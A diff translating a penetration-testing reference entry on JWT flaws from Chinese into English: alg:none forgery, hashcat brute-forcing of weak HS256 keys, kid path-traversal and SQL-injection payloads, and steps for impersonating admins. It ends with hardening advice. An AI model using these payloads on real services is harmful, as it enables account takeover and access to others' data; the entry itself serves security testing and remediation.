@@ -1,60 +1,60 @@
 ---
-title: JWT 实现缺陷（alg:none / 弱密钥 / 可预测 / kid 注入）
-cve: 无（实现缺陷）
+title: JWT implementation flaws (alg:none / weak keys / predictability / kid injection)
+cve: None (implementation flaw)
 severity: high
 cvss: 8.1
-product: 自研 Web/App 后端（JJWT、java-jwt、PyJWT 等）
-versions: 任意
+product: Custom Web/App backend (JJWT, java-jwt, PyJWT, etc.)
+versions: Any
 ports: 80, 443
-keywords: jwt, alg none, hmac, hashcat 16500, kid, 越权, 提权
+keywords: jwt, alg none, hmac, hashcat 16500, kid, broken access control, privilege escalation
 verified: false
-sources: 公开资料整理（业务逻辑 / 实现 / 配置缺陷类，无 CVE；出处见文末参考）
+sources: Compiled from public sources (business logic / implementation / configuration flaws; no CVE; see references at the end)
 ---
 
-## 指纹
+## Fingerprints
 
-- 请求头 `Authorization: Bearer eyJ...`，或 Cookie `token=`；
-- 解码 payload 见 `{"alg":"HS256","uid":123,"role":"user"}` 之类。
+- Request header `Authorization: Bearer eyJ...`, or Cookie `token=`;
+- Decoding the payload reveals values such as `{"alg":"HS256","uid":123,"role":"user"}`.
 
-## 前置条件
+## Prerequisites
 
-- 一个普通账号 + 能改自己请求。
+- One regular account + ability to modify your own requests.
 
 ## PoC
 
 ```bash
-# 解码
+# Decode
 python3 -c "import base64,sys;print(base64.urlsafe_b64decode(sys.argv[1]+'=='))" <payload>
 
-# 1) alg:none —— 去掉签名
-#    header 改 {"alg":"none","typ":"JWT"}，payload 改 uid/role，签名段留空
+# 1) alg:none — remove the signature
+#    Change the header to {"alg":"none","typ":"JWT"}, modify uid/role in the payload, and leave the signature segment empty
 
-# 2) HS256 弱密钥爆破
+# 2) Brute-force weak HS256 keys
 hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
-#   常见 secret: secret、jwtSecret、xxx2024、公司域名、123456
+#   Common secrets: secret, jwtSecret, xxx2024, company domain, 123456
 
-# 3) kid 注入（服务端用 kid 找密钥文件）
-{"alg":"HS256","kid":"../../../../dev/null"}   → 空密钥签名
-{"alg":"HS256","kid":"key' UNION SELECT 'known'--"}  → SQL 注入取密钥
+# 3) kid injection (server uses kid to locate the key file)
+{"alg":"HS256","kid":"../../../../dev/null"}   → sign with an empty key
+{"alg":"HS256","kid":"key' UNION SELECT 'known'--"}  → retrieve the key through SQL injection
 
-# 4) 可预测：payload 里 sub/iat 是时间戳、或 token = md5(uid)
+# 4) Predictability: sub/iat in the payload are timestamps, or token = md5(uid)
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 解 token，记录 `uid`、`role`、`tenant`、`agentId` 这些 claim。
-2. 依次试 none → 弱密钥 → kid 注入 → 可预测；任一成功即伪造任意用户。
-3. 改 `role=admin` / `uid=1` 重放，观察是否进后台或读到他人数据（与 `api-idor-bola.md` 组合）。
-4. 若服务端只校验签名不校验过期（`exp`），可长期复用旧 token。
-5. 证据：原始 token（可脱敏尾段）+ 伪造后响应。
+1. Decode the token and record claims such as `uid`, `role`, `tenant`, and `agentId`.
+2. Try none → weak keys → kid injection → predictability; any success enables impersonating arbitrary users.
+3. Change `role=admin` / `uid=1` and replay; check for backend access or other users' data (combine with `api-idor-bola.md`).
+4. If the server validates only the signature, not expiration (`exp`), old tokens can be reused long-term.
+5. Evidence: original token (the final segment may be redacted) + response after forgery.
 
-## 修复与缓解（加固）
+## Remediation and Mitigation (Hardening)
 
-- 密钥强随机（≥32 字节）且定期轮换；优先 RS256/ES256 并固定公钥。
-- 服务端强制校验 `alg` 白名单（拒绝 `none`）、`exp`/`iat`/`aud`/`iss`。
-- `kid` 只允许白名单键名，禁止拼路径/SQL；密钥不落前端。
-- token 短期 + refresh token，敏感操作二次验证。
+- Use strongly random keys (≥32 bytes) and rotate regularly; prefer RS256/ES256 with a fixed public key.
+- Enforce an `alg` allowlist (reject `none`) and validate `exp`/`iat`/`aud`/`iss` server-side.
+- Allow only allowlisted key names for `kid`; prohibit path/SQL concatenation; never put keys in the frontend.
+- Short-lived tokens + refresh tokens; step-up verification for sensitive operations.
 
-## 参考
+## References
 
-- OWASP JWT Cheat Sheet；PortSwigger JWT 攻击系列。
+- OWASP JWT Cheat Sheet; PortSwigger JWT attack series.
